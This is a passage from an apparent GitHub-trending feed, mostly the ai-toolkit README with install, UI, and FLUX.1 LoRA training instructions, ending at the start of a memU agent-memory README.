src="https://c10.patreonusercontent.com/4/patreon-media/p/user/73708729/52866102958248c19e646b6b62c7c51a/eyJ3IjoyMDB9/1.png?token-hash=S_haqcc-5zBK1tefXbphLzvA-MGtmstPNlaHch3k4zo%3D" alt="Cora Nox" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/5103404/7dd6a7be5dd640038c426c61419a5aad/eyJ3IjoyMDB9/2.jpg?token-hash=7ref-eq7sSeODxCWYcfh-wrQkhnS8L4ujGIWjlV8HdE%3D" alt="Corey Corza" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/12844508/fd08528fbed74a359acb1f8d06181c0c/eyJ3IjoyMDB9/1.jpeg?token-hash=TNDGh5TSWmlteKxsvB6FLE9wwawPMyvNBaim2U2KRC4%3D" alt="Dave Talbott" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/49455/F" alt="freke70 " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/58082790/5f425b9f949047f78d9ae98e86faad35/eyJ3IjoyMDB9/1.png?token-hash=WYfg_M7cLsY-crrv71jcy6LLV77bB0_uD2_aw2f9nJ0%3D" alt="Greg Lemons" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/195837329/a136ba74b4d94df3a2b37e944beb6b9d/eyJ3IjoyMDB9/1.png?token-hash=oAIpcAmkts3GjjTjJVg2QrYs4UdcXgbW8q11p4kjVqQ%3D" alt="Greg Richards" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/100521338/J" alt="Jayson King" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/12128150/J" alt="Joshua Genke" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/75353/cff7a01bb97a45bba9023f1ff4a5f07a/eyJ3IjoyMDB9/1.jpeg?token-hash=3TxvQTWQSYWeqK4Elb6lX9y5ts21jh5jsWa1cXykcG8%3D" alt="Kenneth Loebenberg" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/31096978/f36222d290d2438cba8cfa3de63453c9/eyJ3IjoyMDB9/1.JPG?token-hash=0gwLI-GVquqxBj3FRR4XqJuRonvT5FsN5rdND2jApL0%3D" alt="Le_Fourbe " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/97609519/M" alt="Mollie" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/683426/N" alt="Noodles" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c8.patreon.com/4/200/4544036/O" alt="Osman Bayazit" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/106121692/060eb9f09ecc4dceb7fa0a6d3c330b85/eyJ3IjoyMDB9/1.jpeg?token-hash=K6vA5Foyh9tAy3yzCtuYKDRF9McrCbQaEUC61x2x1Ic%3D" alt="Pablo Fonseca" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/188726649/6db3706d63f14468a58535ae5fd1344c/eyJ3IjoyMDB9/1.png?token-hash=QzCqu543VaxIuxyXo_1qrYqBQAyOhprcfNfNSIN3TYk%3D" alt="Phil Ring" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/ProPatte" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/228614493?u=45908a4a76165a83ce0b20a474a4d7fd027d67af&amp;amp;v=4" alt="ProPatte" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/196027905/1d46e7eeaf7e45229bbbf0f64683f337/eyJ3IjoyMDB9/1.jpeg?token-hash=JkpA_7525wqMEeVAFU6Qb7AK4lrAnjtisI7i4U8NrwI%3D" alt="qassem benhayoun" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/25199293/e967e5c4ed884f07b705271e253fd584/eyJ3IjoyMDB9/1.png?token-hash=uupXPicJ3Glks9mm5WDriIb1PBUbRmoVgSR6vcMPjlY%3D" alt="Rob Stevens" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/2622685/bddc4b42c82c47d8b30b05c000b8127b/eyJ3IjoyMDB9/1.jpg?token-hash=4tEFL9DP2L5dpg7rxUcFBlw27qnHO2ceyG38RtI9_Hg%3D" alt="Saftle " width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/45125613/8a45d1081bfc43b0bf4cb523558cab65/eyJ3IjoyMDB9/3.jpeg?token-hash=iUZhvndnfAiT97FacklmB4XvnMxj0pvepaHsU7JBxLg%3D" alt="Tiny Tsuruta" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/7408850/e90af02547724fc59ca1f21565df93b1/eyJ3IjoyMDB9/1.png?token-hash=RnqIUjFVhT7ZpV79q8cgTxCULkVfyQxpWNy4yIQIhlk%3D" alt="Virtamouse" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/107652364/5cae258ff5cd4c9a8e104861e63d5180/eyJ3IjoyMDB9/1.png?token-hash=qkRK53prBXDFG4b_Opnb80wcvWj6q0FjgNqPoSz24yU%3D" alt="Yi Chen" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Boris HANSSEN" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Juan Franco" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;a href="https://github.com/marksverdhei" target="_blank" rel="noopener noreferrer"&gt;&lt;img src="https://avatars.githubusercontent.com/u/46672778?u=d1ba8b17516e6ecf1cd55ca4db2b770f82285aad&amp;amp;v=4" alt="Markus / Mark" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt;&lt;/a&gt; &lt;img src="https://c10.patreonusercontent.com/4/patreon-media/p/user/134029856/d1c895bf165149f69ad81ac426e617e9/eyJ3IjoyMDB9/1.jpeg?token-hash=FPzyMI3pAjnZmRlH_nmy2baIRcGKtQrDnN6aMCOHVwo%3D" alt="v33ts" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;img src="https://ostris.com/wp-content/uploads/2025/08/supporter_default.jpg" alt="Fabrizio Pasqualicchio" width="60" height="60" style="border-radius:8px;margin:5px;display: inline-block;" /&gt; &lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Installation&lt;/h2&gt; 
&lt;p&gt;Requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;python &amp;gt;3.10&lt;/li&gt; 
 &lt;li&gt;Nvidia GPU with enough ram to do what you need&lt;/li&gt; 
 &lt;li&gt;python venv&lt;/li&gt; 
 &lt;li&gt;git&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Linux:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/ostris/ai-toolkit.git
cd ai-toolkit
python3 -m venv venv
source venv/bin/activate
# install torch first
pip3 install --no-cache-dir torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/cu126
pip3 install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For devices running &lt;strong&gt;DGX OS&lt;/strong&gt; (including DGX Spark), follow &lt;a href="https://raw.githubusercontent.com/ostris/ai-toolkit/main/dgx_instructions.md"&gt;these&lt;/a&gt; instructions.&lt;/p&gt; 
&lt;p&gt;Windows:&lt;/p&gt; 
&lt;p&gt;If you are having issues with Windows. I recommend using the easy install script at &lt;a href="https://github.com/Tavris1/AI-Toolkit-Easy-Install"&gt;https://github.com/Tavris1/AI-Toolkit-Easy-Install&lt;/a&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;git clone https://github.com/ostris/ai-toolkit.git
cd ai-toolkit
python -m venv venv
.\venv\Scripts\activate
pip install --no-cache-dir torch==2.7.0 torchvision==0.22.0 torchaudio==2.7.0 --index-url https://download.pytorch.org/whl/cu126
pip install -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h1&gt;AI Toolkit UI&lt;/h1&gt; 
&lt;img src="https://ostris.com/wp-content/uploads/2025/02/toolkit-ui.jpg" alt="AI Toolkit UI" width="100%" /&gt; 
&lt;p&gt;The AI Toolkit UI is a web interface for the AI Toolkit. It allows you to easily start, stop, and monitor jobs. It also allows you to easily train models with a few clicks. It also allows you to set a token for the UI to prevent unauthorized access so it is mostly safe to run on an exposed server.&lt;/p&gt; 
&lt;h2&gt;Running the UI&lt;/h2&gt; 
&lt;p&gt;Requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Node.js &amp;gt; 18&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The UI does not need to be kept running for the jobs to run. It is only needed to start/stop/monitor jobs. The commands below will install / update the UI and it's dependencies and start the UI.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd ui
npm run build_and_start
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can now access the UI at &lt;code&gt;http://localhost:8675&lt;/code&gt; or &lt;code&gt;http://&amp;lt;your-ip&amp;gt;:8675&lt;/code&gt; if you are running it on a server.&lt;/p&gt; 
&lt;h2&gt;Securing the UI&lt;/h2&gt; 
&lt;p&gt;If you are hosting the UI on a cloud provider or any network that is not secure, I highly recommend securing it with an auth token. You can do this by setting the environment variable &lt;code&gt;AI_TOOLKIT_AUTH&lt;/code&gt; to super secure password. This token will be required to access the UI. You can set this when starting the UI like so:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Linux
AI_TOOLKIT_AUTH=super_secure_password npm run build_and_start

# Windows
set AI_TOOLKIT_AUTH=super_secure_password &amp;amp;&amp;amp; npm run build_and_start

# Windows Powershell
$env:AI_TOOLKIT_AUTH="super_secure_password"; npm run build_and_start
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;FLUX.1 Training&lt;/h2&gt; 
&lt;h3&gt;Tutorial&lt;/h3&gt; 
&lt;p&gt;To get started quickly, check out &lt;a href="https://x.com/araminta_k"&gt;@araminta_k&lt;/a&gt; tutorial on &lt;a href="https://www.youtube.com/watch?v=HzGW_Kyermg"&gt;Finetuning Flux Dev on a 3090&lt;/a&gt; with 24GB VRAM.&lt;/p&gt; 
&lt;h3&gt;Requirements&lt;/h3&gt; 
&lt;p&gt;You currently need a GPU with &lt;strong&gt;at least 24GB of VRAM&lt;/strong&gt; to train FLUX.1. If you are using it as your GPU to control your monitors, you probably need to set the flag &lt;code&gt;low_vram: true&lt;/code&gt; in the config file under &lt;code&gt;model:&lt;/code&gt;. This will quantize the model on CPU and should allow it to train with monitors attached. Users have gotten it to work on Windows with WSL, but there are some reports of a bug when running on windows natively. I have only tested on linux for now. This is still extremely experimental and a lot of quantizing and tricks had to happen to get it to fit on 24GB at all.&lt;/p&gt; 
&lt;h3&gt;FLUX.1-dev&lt;/h3&gt; 
&lt;p&gt;FLUX.1-dev has a non-commercial license. Which means anything you train will inherit the non-commercial license. It is also a gated model, so you need to accept the license on HF before using it. Otherwise, this will fail. Here are the required steps to setup a license.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Sign into HF and accept the model access here &lt;a href="https://huggingface.co/black-forest-labs/FLUX.1-dev"&gt;black-forest-labs/FLUX.1-dev&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;Make a file named &lt;code&gt;.env&lt;/code&gt; in the root on this folder&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://huggingface.co/settings/tokens/new?"&gt;Get a READ key from huggingface&lt;/a&gt; and add it to the &lt;code&gt;.env&lt;/code&gt; file like so &lt;code&gt;HF_TOKEN=your_key_here&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;FLUX.1-schnell&lt;/h3&gt; 
&lt;p&gt;FLUX.1-schnell is Apache 2.0. Anything trained on it can be licensed however you want and it does not require a HF_TOKEN to train. However, it does require a special adapter to train with it, &lt;a href="https://huggingface.co/ostris/FLUX.1-schnell-training-adapter"&gt;ostris/FLUX.1-schnell-training-adapter&lt;/a&gt;. It is also highly experimental. For best overall quality, training on FLUX.1-dev is recommended.&lt;/p&gt; 
&lt;p&gt;To use it, You just need to add the assistant to the &lt;code&gt;model&lt;/code&gt; section of your config file like so:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      model:
        name_or_path: "black-forest-labs/FLUX.1-schnell"
        assistant_lora_path: "ostris/FLUX.1-schnell-training-adapter"
        is_flux: true
        quantize: true
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You also need to adjust your sample steps since schnell does not require as many&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      sample:
        guidance_scale: 1  # schnell does not do guidance
        sample_steps: 4  # 1 - 4 works well
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Training&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Copy the example config file located at &lt;code&gt;config/examples/train_lora_flux_24gb.yaml&lt;/code&gt; (&lt;code&gt;config/examples/train_lora_flux_schnell_24gb.yaml&lt;/code&gt; for schnell) to the &lt;code&gt;config&lt;/code&gt; folder and rename it to &lt;code&gt;whatever_you_want.yml&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Edit the file following the comments in the file&lt;/li&gt; 
 &lt;li&gt;Run the file like so &lt;code&gt;python run.py config/whatever_you_want.yml&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;A folder with the name and the training folder from the config file will be created when you start. It will have all checkpoints and images in it. You can stop the training at any time using ctrl+c and when you resume, it will pick back up from the last checkpoint.&lt;/p&gt; 
&lt;p&gt;IMPORTANT. If you press crtl+c while it is saving, it will likely corrupt that checkpoint. So wait until it is done saving&lt;/p&gt; 
&lt;h3&gt;Need help?&lt;/h3&gt; 
&lt;p&gt;Please do not open a bug report unless it is a bug in the code. You are welcome to &lt;a href="https://discord.gg/VXmU2f5WEU"&gt;Join my Discord&lt;/a&gt; and ask for help there. However, please refrain from PMing me directly with general question or support. Ask in the discord and I will answer when I can.&lt;/p&gt; 
&lt;h2&gt;Gradio UI&lt;/h2&gt; 
&lt;p&gt;To get started training locally with a with a custom UI, once you followed the steps above and &lt;code&gt;ai-toolkit&lt;/code&gt; is installed:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd ai-toolkit #in case you are not yet in the ai-toolkit folder
huggingface-cli login #provide a `write` token to publish your LoRA at the end
python flux_train_ui.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You will instantiate a UI that will let you upload your images, caption them, train and publish your LoRA &lt;img src="https://raw.githubusercontent.com/ostris/ai-toolkit/main/assets/lora_ease_ui.png" alt="image" /&gt;&lt;/p&gt; 
&lt;h2&gt;Training in RunPod&lt;/h2&gt; 
&lt;p&gt;If you would like to use Runpod, but have not signed up yet, please consider using &lt;a href="https://runpod.io?ref=h0y9jyr2"&gt;my Runpod affiliate link&lt;/a&gt; to help support this project.&lt;/p&gt; 
&lt;p&gt;I maintain an official Runpod Pod template here which can be accessed &lt;a href="https://console.runpod.io/deploy?template=0fqzfjy6f3&amp;amp;ref=h0y9jyr2"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;I have also created a short video showing how to get started using AI Toolkit with Runpod &lt;a href="https://youtu.be/HBNeS-F6Zz8"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Training in Modal&lt;/h2&gt; 
&lt;h3&gt;1. Setup&lt;/h3&gt; 
&lt;h4&gt;ai-toolkit:&lt;/h4&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/ostris/ai-toolkit.git
cd ai-toolkit
git submodule update --init --recursive
python -m venv venv
source venv/bin/activate
pip install torch
pip install -r requirements.txt
pip install --upgrade accelerate transformers diffusers huggingface_hub #Optional, run it if you run into issues
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Modal:&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Run &lt;code&gt;pip install modal&lt;/code&gt; to install the modal Python package.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;modal setup&lt;/code&gt; to authenticate (if this doesn‚Äôt work, try &lt;code&gt;python -m modal setup&lt;/code&gt;).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Hugging Face:&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Get a READ token from &lt;a href="https://huggingface.co/settings/tokens"&gt;here&lt;/a&gt; and request access to Flux.1-dev model from &lt;a href="https://huggingface.co/black-forest-labs/FLUX.1-dev"&gt;here&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;huggingface-cli login&lt;/code&gt; and paste your token.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;2. Upload your dataset&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Drag and drop your dataset folder containing the .jpg, .jpeg, or .png images and .txt files in &lt;code&gt;ai-toolkit&lt;/code&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;3. Configs&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Copy an example config file located at &lt;code&gt;config/examples/modal&lt;/code&gt; to the &lt;code&gt;config&lt;/code&gt; folder and rename it to &lt;code&gt;whatever_you_want.yml&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;Edit the config following the comments in the file, &lt;strong&gt;&lt;ins&gt;be careful and follow the example &lt;code&gt;/root/ai-toolkit&lt;/code&gt; paths&lt;/ins&gt;&lt;/strong&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;4. Edit run_modal.py&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;Set your entire local &lt;code&gt;ai-toolkit&lt;/code&gt; path at &lt;code&gt;code_mount = modal.Mount.from_local_dir&lt;/code&gt; like:&lt;/p&gt; &lt;pre&gt;&lt;code&gt;code_mount = modal.Mount.from_local_dir("/Users/username/ai-toolkit", remote_path="/root/ai-toolkit")
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;Choose a &lt;code&gt;GPU&lt;/code&gt; and &lt;code&gt;Timeout&lt;/code&gt; in &lt;code&gt;@app.function&lt;/code&gt; &lt;em&gt;(default is A100 40GB and 2 hour timeout)&lt;/em&gt;.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;5. Training&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Run the config file in your terminal: &lt;code&gt;modal run run_modal.py --config-file-list-str=/root/ai-toolkit/config/whatever_you_want.yml&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;You can monitor your training in your local terminal, or on &lt;a href="https://modal.com/"&gt;modal.com&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;Models, samples and optimizer will be stored in &lt;code&gt;Storage &amp;gt; flux-lora-models&lt;/code&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;6. Saving the model&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Check contents of the volume by running &lt;code&gt;modal volume ls flux-lora-models&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;Download the content by running &lt;code&gt;modal volume get flux-lora-models your-model-name&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;Example: &lt;code&gt;modal volume get flux-lora-models my_first_flux_lora_v1&lt;/code&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Screenshot from Modal&lt;/h3&gt; 
&lt;img width="1728" alt="Modal Traning Screenshot" src="https://github.com/user-attachments/assets/7497eb38-0090-49d6-8ad9-9c8ea7b5388b" /&gt; 
&lt;hr /&gt; 
&lt;h2&gt;Dataset Preparation&lt;/h2&gt; 
&lt;p&gt;Datasets generally need to be a folder containing images and associated text files. Currently, the only supported formats are jpg, jpeg, and png. Webp currently has issues. The text files should be named the same as the images but with a &lt;code&gt;.txt&lt;/code&gt; extension. For example &lt;code&gt;image2.jpg&lt;/code&gt; and &lt;code&gt;image2.txt&lt;/code&gt;. The text file should contain only the caption. You can add the word &lt;code&gt;[trigger]&lt;/code&gt; in the caption file and if you have &lt;code&gt;trigger_word&lt;/code&gt; in your config, it will be automatically replaced.&lt;/p&gt; 
&lt;p&gt;Images are never upscaled but they are downscaled and placed in buckets for batching. &lt;strong&gt;You do not need to crop/resize your images&lt;/strong&gt;. The loader will automatically resize them and can handle varying aspect ratios.&lt;/p&gt; 
&lt;h2&gt;Training Specific Layers&lt;/h2&gt; 
&lt;p&gt;To train specific layers with LoRA, you can use the &lt;code&gt;only_if_contains&lt;/code&gt; network kwargs. For instance, if you want to train only the 2 layers used by The Last Ben, &lt;a href="https://x.com/__TheBen/status/1829554120270987740"&gt;mentioned in this post&lt;/a&gt;, you can adjust your network kwargs like so:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          only_if_contains:
            - "transformer.single_transformer_blocks.7.proj_out"
            - "transformer.single_transformer_blocks.20.proj_out"
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The naming conventions of the layers are in diffusers format, so checking the state dict of a model will reveal the suffix of the name of the layers you want to train. You can also use this method to only train specific groups of weights. For instance to only train the &lt;code&gt;single_transformer&lt;/code&gt; for FLUX.1, you can use the following:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          only_if_contains:
            - "transformer.single_transformer_blocks."
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can also exclude layers by their names by using &lt;code&gt;ignore_if_contains&lt;/code&gt; network kwarg. So to exclude all the single transformer blocks,&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      network:
        type: "lora"
        linear: 128
        linear_alpha: 128
        network_kwargs:
          ignore_if_contains:
            - "transformer.single_transformer_blocks."
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;code&gt;ignore_if_contains&lt;/code&gt; takes priority over &lt;code&gt;only_if_contains&lt;/code&gt;. So if a weight is covered by both, if will be ignored.&lt;/p&gt; 
&lt;h2&gt;LoKr Training&lt;/h2&gt; 
&lt;p&gt;To learn more about LoKr, read more about it at &lt;a href="https://github.com/KohakuBlueleaf/LyCORIS/raw/main/docs/Guidelines.md"&gt;KohakuBlueleaf/LyCORIS&lt;/a&gt;. To train a LoKr model, you can adjust the network type in the config file like so:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-yaml"&gt;      network:
        type: "lokr"
        lokr_full_rank: true
        lokr_factor: 8
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Everything else should work the same including layer targeting.&lt;/p&gt; 
&lt;h2&gt;Updates&lt;/h2&gt; 
&lt;p&gt;Only larger updates are listed here. There are usually smaller daily updated that are omitted.&lt;/p&gt; 
&lt;h3&gt;Jul 17, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Make it easy to add control images to the samples in the ui&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Jul 11, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Added better video config settings to the UI for video models.&lt;/li&gt; 
 &lt;li&gt;Added Wan I2V training to the UI&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 29, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fixed issue where Kontext forced sizes on sampling&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 26, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Added support for FLUX.1 Kontext training&lt;/li&gt; 
 &lt;li&gt;added support for instruction dataset training&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 25, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Added support for OmniGen2 training&lt;/li&gt; 
 &lt;li&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 17, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Performance optimizations for batch preparation&lt;/li&gt; 
 &lt;li&gt;Added some docs via a popup for items in the simple ui explaining what settings do. Still a WIP&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 16, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Hide control images in the UI when viewing datasets&lt;/li&gt; 
 &lt;li&gt;WIP on mean flow loss&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 12, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Fixed issue that resulted in blank captions in the dataloader&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;June 10, 2025&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Decided to keep track up updates in the readme&lt;/li&gt; 
 &lt;li&gt;Added support for SDXL in the UI&lt;/li&gt; 
 &lt;li&gt;Added support for SD 1.5 in the UI&lt;/li&gt; 
 &lt;li&gt;Fixed UI Wan 2.1 14b name bug&lt;/li&gt; 
 &lt;li&gt;Added support for for conv training in the UI for models that support it&lt;/li&gt; 
&lt;/ul&gt;</description>
    </item>
    
    <item>
      <title>NevaMind-AI/memU</title>
      <link>https://github.com/NevaMind-AI/memU</link>
      <description>&lt;p&gt;Memory for 24/7 proactive agents like openclaw (moltbot, clawdbot).&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/banner.png" alt="MemU Banner" /&gt;&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;h1&gt;memU&lt;/h1&gt; 
 &lt;h3&gt;24/7 Always-On Proactive Memory for AI Agents&lt;/h3&gt; 
 &lt;p&gt;&lt;a href="https://badge.fury.io/py/memu-py"&gt;&lt;img src="https://badge.fury.io/py/memu-py.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;a href="https://opensource.org/licenses/Apache-2.0"&gt;&lt;img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg?sanitize=true" alt="License: Apache 2.0" /&gt;&lt;/a&gt; &lt;a href="https://www.python.org/downloads/"&gt;&lt;img src="https://img.shields.io/badge/python-3.13+-blue.svg?sanitize=true" alt="Python 3.13+" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/memu"&gt;&lt;img src="https://img.shields.io/badge/Discord-Join%20Chat-5865F2?logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt; &lt;a href="https://x.com/memU_ai"&gt;&lt;img src="https://img.shields.io/badge/Twitter-Follow-1DA1F2?logo=x&amp;amp;logoColor=white" alt="Twitter" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://trendshift.io/repositories/17374" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/17374" alt="NevaMind-AI%2FmemU | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;&lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_en.md"&gt;English&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_zh.md"&gt;‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_ja.md"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_ko.md"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_es.md"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/readme/README_fr.md"&gt;Fran√ßais&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
